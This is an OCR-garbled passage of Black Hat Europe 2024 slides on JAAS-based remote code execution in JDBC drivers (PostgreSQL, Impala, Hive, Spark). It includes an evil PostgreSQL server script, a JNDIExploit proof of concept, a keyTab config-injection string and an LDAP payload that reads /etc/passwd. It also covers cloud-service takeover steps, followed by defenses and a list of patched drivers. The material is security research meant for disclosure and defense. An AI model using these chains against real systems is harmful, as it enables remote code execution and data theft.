##### Download Java libs in bulk

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.2 How we hunted bugs
Download Java libs in bulk
Maver
. Google
> Bing
N
<APACHE ANT>
Information Classification: General
```

## Slide 81

## 3.2 How we hunted bugs Analyze automatically and manually

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.2 How we hunted bugs
Analyze automatically and manually
2)
;
filter1: keywords & tags
ay 4 filter2: static program analysis
filter3: code review
0;
Information Classification: General
```

## Slide 82

## 3.3 What we found

Controllable system property: PostgreSQL JDBC driver

**PoC**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 83

## 3.3 What we found

##### Evil PostgreSQL Server

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.3 What we found
Evil PostgreSQL Server
import socket, binascii, os
def receive_data(conn):
data = conn. recv(1024)
print("[*] Receiveing the package : {}".format(data) )
return str(data).lower()
if _name_ == '_ main_':
def send_data(conn, data): HOST = '0.0.0.0'
print("[%*] Sending the package : {}".format(binascii.a2b_hex(data) )) PORT = 3307
conn. send(binascii.a2b_hex(data) ) sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sk. setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
def run(): sk.bind((HOST, PORT) )
nossl = "4e" sk. Listen(1)
kerb_login = "520000000c00000007cb99217e" print("start evil pgsql server listening on {}:{}".format(HOST, PORT) )
while 1: run()
conn, addr = sk.accept()
print("Connection come from {}:{}".format(addr[@], addr[1]))
receive_data(conn)
send_data(conn, noss1l)
data = receive_data(conn)
send_data(conn, kerb_login)
data = receive_data(conn)
print (data)
Information Classification: General
```

## Slide 84

## 3.3 What we found

##### The attack process

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.3 What we found
The attack process
@ setup
’
Evil PostgreSQL Evil HTTP Server
Server
h '
© connect ® read login config file
|
—_|—_>
we oe fa} i &
+2 taken over
Attacker JDBC driver car JAAS (Dk vere
© authenticate
ete login config URL &
I
lookup
v
JVM
—>|
@ payload
(=<) id
© set up _——) :
0)
Information Classification: General Evil JNDI Server
```

## Slide 85

## 3.3 What we found

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Ba *
2) an ae
black hat hes
EUROPE 2024 4
3.3 What we found
Information Classification: General
```

## Slide 86

## 3.3 What we found

##### Controllable system property: other JDBC drivers

🙃 similar to PostgreSQL JDBC driver

Information Classification: General

#BHEU @BlackHatEvents

## Slide 87

## 3.3 What we found

Controllable URL of login config: Impala JDBC driver

**PoC**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 88

## 3.3 What we found

##### Run the PoC

JNDI Server

impala.conf

HTTP Server

#BHEU @BlackHatEvents

Information Classification: General

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.3 What we found
Run the PoC
© Impala.java $ Terminal: Local Local (2) a NA fey
public class Impala { v test@l ! JNDIExploit1.4 % java -jar JNDIExploit.jar -i localhost
public static void main(String[] args) throws Exception { [+] LDAP Server Start Listening on 1389...
String url = "jdbc:impala://127.0.0.1:8000;AuthMech=1;KrbAuthType=1;" + [+] HTTP Server Start Listening on 3456... J N D| Server
"KrbRealm=HADOOP. COM; KrbHostFQDN=host;KrbServiceName=impala;" + [+] Received LDAP Query: Basic/Command/open -a Calculator
"krbJAASFile=http://127.0.0.1:8000/impala. conf"; [+] Paylaod: command
DriverManager.getConnection(url); [+] Command: open -a Calculator
} [+] Sending LDAP ResourceRef result for Basic/Command/open -a Calculator with basi
} c remote reference payload
[+] Send LDAP reference result for Basic/Command/open -a Calculator redirecting to
[+] New HTTP Request From /127.0.0.1:58651 /ExploitKpYOEotqXX.class
[+] Receive ClassRequest: ExploitKpYOEotqXX.class
[+] Response Code: 200
= impala.conf = ; test@ /tmp % python3 -m http.server 8000
Client { impala.cont Serving HTTP on :: port 8000 (http://[::]:8000/) ... HTTP Server
riffff:127.0.0.1 - - [25/Nov/2024 13:39:49] "GET /impala.conf HTTP/1.1" 200 -
com.sun.security.auth.module.JndiLoginModule required
user. provider.url="ldap://localhost:1389/Basic/Command/open -a Calculator" J
useFirstPass="true"
group. provider.url="xxx";
i;
Run: Impala fo
t at com.cloudera. impala. jdbc.common.BaseConnectionFactory.doConnect( )
at com.cloudera.impala.jdbc.common.AbstractDriver.connect( )
“A |S at java.sql.DriverManager.getConnection( )
at java.sql.DriverManager.getConnection( )
le vl
at example.Impala.main(Impala. java:10)
Information Classification: General
```

## Slide 89

## 3.3 What we found

##### The attack process

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.3 What we found
The attack process
@ set up gO
Evil HTTP Server @ read login config file
r—@ parse URL JVM
<TC) at ( —-© set login config url—> G
= 6) JDBC URE@———|= aN =—)
y <+—1) taken over : © login > ——
Attacker Impala JDBC r— JAAS JDK)
driver authenticate
Poe ae
|
© lookup
a= @@
| ___@ payload
a
setup Sry
Information Classification: General Evil JNDI Server
```

## Slide 90

## 3.3 What we found

##### Controllable URL of login config: other JDBC drivers

CLOUDERA Hive

Information Classification: General

#BHEU @BlackHatEvents

## Slide 91

## 3.3 What we found

##### Controllable URL of login config: other JDBC drivers

AWS Spark

AWS Hive

AWS Impala

Information Classification: General

#BHEU @BlackHatEvents

## Slide 92

## 3.3 What we found

Controllable URL of login config: other JDBC drivers

insightsoftware Spark

insightsoftware Hive

🤐…

Information Classification: General

#BHEU @BlackHatEvents

## Slide 93

## 3.3 What we found

##### Controllable login config: Cat JDBC driver

Can be injected

* adapted from a real vulnerability

Information Classification: General

#BHEU @BlackHatEvents

## Slide 94

## 3.3 What we found

##### Controllable login config: Cat JDBC driver

Can be injected

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 95

## 3.3 What we found Controllable login config: Cat JDBC driver

**krb5KeyTab**

malicious content

↓injected

↓

**login config**

Krb5ConnectContext { com.sun.security.auth.module.Krb5LoginModule required useTicketCache=true useKeyTab=true keyTab= "malicious content" debug=true doNotPrompt=true; };

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 96

## 3.3 What we found

🤔 Can we inject some malicious config to achieve RCE？

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 97

## 3.3 What we found

##### The process of constructing the payload

① Each entry supports multiple login modules.

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 98

## 3.3 What we found

The process of constructing the payload

**krb5KeyTab**

"; FooLoginModule required key="value

↓injected

↓

**login config**

Krb5ConnectContext { com.sun.security.auth.module.Krb5LoginModule required useTicketCache=true useKeyTab=true keyTab= ""; FooLoginModule required key="value" debug=true doNotPrompt=true; };

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 99

## 3.3 What we found

##### The process of constructing the payload

② The flag of the first login module is required

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 100

## 3.3 What we found

##### The process of constructing the payload

**krb5KeyTab**

"; com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://localhost:1389/Basic/Command/open -a Calculator" useFirstPass="true" <u>group.provider.url="xxx</u>

↓injected

↓

Krb5ConnectContext { com.sun.security.auth.module.Krb5LoginModule required useTicketCache=true useKeyTab=true keyTab= "";

**login config**

com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://localhost:1389/Basic/Command/open -a Calculator" useFirstPass="true"

group.provider.url="xxx" debug=true doNotPrompt=true; };

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 101

## 3.3 What we found

##### Controllable login config: Cat JDBC driver

PoC

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 102

## 3.3 What we found

##### Run the PoC

JNDI Server

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 103

## 3.3 What we found

##### The attack process

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 104

## Agenda

#### 1. Introduction

2. Previous research vs. our findings 3. Hunting for bugs in Java libs

#### **4. Impacts**

🙋

#### 5. Defense

6. Takeaways

Information Classification: General

#BHEU @BlackHatEvents

## Slide 105

### 🤔 What is the impact of these vulnerabilities?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 106

## 4.1 Take over cloud services

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
4.1 Take over cloud services
C)
Alibaba Cloud
r amazon
webservices
Google
Cloud4C_
, TIER 4 CLOUD
— Ef Microsoft Azure
Information Classification: General
```

## Slide 107

## 4.1 Take over cloud services

What is cloud services

Cloud vendors deploy services in their own environments and provide them to users after purchase.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 108

## 4.1 Take over cloud services

🤔 Which cloud services are the most likely to be taken over via our vulnerabilities?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 109

## 4.1 Take over cloud services

##### Cloud services that assist users in conducting data analysis

Information Classification: General

#BHEU @BlackHatEvents

## Slide 110

## 4.1 Take over cloud services

##### Cloud services that assist users in data visualization

Information Classification: General

#BHEU @BlackHatEvents

## Slide 111

## 4.1 Take over cloud services

🤔 How to take over?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 112

## 4.1 Take over cloud services

##### Step 1: Find the place to enter the payload

Information Classification: General

#BHEU @BlackHatEvents

## Slide 113

## 4.1 Take over cloud services

##### Step 2: Exploit the vulnerabilities

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
Server
Connect by:
URL:
Server Host:
Database:
4.1 Take over cloud services
Step 2: Exploit the vulnerabilities
Main Driver properties SSH Proxy SSL
Host © URL
jdbc:dog;://127.0.0.1:8000;foo=1;bar=1;configFile=http://1 27.0.0.1:8000/dog.conf{
Test Connection ... < Back
Information Classification: General
Cancel
Port:
Add Kafka Data Source
Data Source :
Description
* Kafka Broker:
* Client Version:
* Security Protocol :
* Sasl Mechanism :
Properties :
192.168.0.1:9092
3.2.3
SASL_PLAINTEXT
GSSAPI(Kerberos) @) PLAIN SCRAM-256 SCRAM-512
{'sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required
user.provider.url=\"Idap://localhost/hhylKPnySW/Plain/Exec/ey)jbWQiOiJjYXQgL2VOYy9wYXNzd
2QifQ==\" useFirstPass=\"true\" group.provider.url=\"xxx\";"}
Previous Step
A complete
```

## Slide 114

## 4.1 Take over cloud services

##### Step 3: Take over the Executor

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
4.1 Take over cloud services
Step 3: Take over the Executor
<a
——_
——_
Ga
UserA ee Data Source A
} —--) ayy Ga
‘ ca =
Gea
User B Config Service Executor Data Source B
ee a aia
<F —
We cama
amas
Attacker Evil Data Source
(MySQL, Kafka, etc)
```

## Slide 115

## 4.1 Take over cloud services

##### Step 4: Take over all the data sources

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
4.1 Take over cloud services
Step 4: Take over all the data sources
a
Cloud Service
2.)
User B \eo Executor
@
Attacker Evil Data Source
(MySQL, Kafka, etc)
Information Classification: General
```

## Slide 116

## 4.1 Take over cloud services

🤔 What else?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 117

## 4.2 From executing SQL to RCE Support external data sources

**https://www.postgresql.org/docs/current/postgres-fdw.html#POSTGRES-FDW-EXAMPLES**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 118

## 4.2 From executing SQL to RCE Support external data sources

**https://clickhouse.com/docs/en/sql-reference/table-functions/jdbc**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 119

## 4.2 From executing SQL to RCE

If a DBMS supports a vulnerable driver, we can take over it.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 120

## Agenda

#### 1. Introduction

#### 2. Previous research vs. our findings 3. Hunting for bugs in Java libs

4. Impacts

#### **5. Defense**

🙋

#### 6. Takeaways

Information Classification: General

#BHEU @BlackHatEvents

## Slide 121

## 5 Defense

- Don’t trust input from users.

- • Actively update Java libs or apply patches.

- • Use whitelist.

- Use whitelist instead of blacklist.

- Disallow loading login config remotely.

- • Disable some login modules (e.g., JNDILoginModule) by default.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 122

## Agenda

#### 1. Introduction

#### 2. Previous research vs. our findings

3. Hunting for bugs in Java libs

4. Impacts

#### 5. Defense

#### **6. Takeaways**

🙋

Information Classification: General

#BHEU @BlackHatEvents

## Slide 123

## 6 Takeaways

- Know how to use JAAS and how it works

- Know some vulnerabilities about JAAS and their root causes

- Acquire a new technique to achieve RCE

- Know how to securely integrate JAAS into Java libraries

-

- …

Information Classification: General

#BHEU @BlackHatEvents

## Slide 124

# Thanks

#BHEU @BlackHatEvents

## Slide 125

## Appendix

##### Some patched JDBC drivers

|AWS Hive|http://awssupportdatasvcs.com/bootstrap-actions/Simba/latest/|
|---|---|
|AWS Impala|http://awssupportdatasvcs.com/bootstrap-actions/Simba/latest/|
|AWS Spark|http://awssupportdatasvcs.com/bootstrap-actions/Simba/latest/|
|CLOUDERA Hive|https://www.cloudera.com/downloads/connectors/hive/jdbc/2-6-25.html|
|CLOUDERA Impala|https://www.cloudera.com/downloads/connectors/impala/jdbc/2-6-35.html|
|Databricks|https://www.databricks.com/spark/jdbc-drivers-download|

Information Classification: General

#BHEU @BlackHatEvents
